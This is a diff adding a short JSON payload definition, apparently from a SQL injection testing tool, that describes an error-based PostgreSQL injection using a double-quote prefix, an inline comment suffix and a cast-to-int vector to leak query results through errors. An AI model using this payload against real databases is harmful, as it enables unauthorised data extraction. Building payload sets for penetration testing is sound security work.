@@ -1,0 +1,12 @@
+{
+ "dbms": "pgsql",
+ "technique": "error",
+ "boundary": {
+  "prefix": "\"",
+  "suffix": "-- -",
+  "type": "double-quote",
+  "desc": "double-quoted + inline comment"
+ },
+ "vector": "{B} AND 1=cast(({Q}) as int)",
+ "comment": "pgsql error via double-quoted + inline comment"
+}
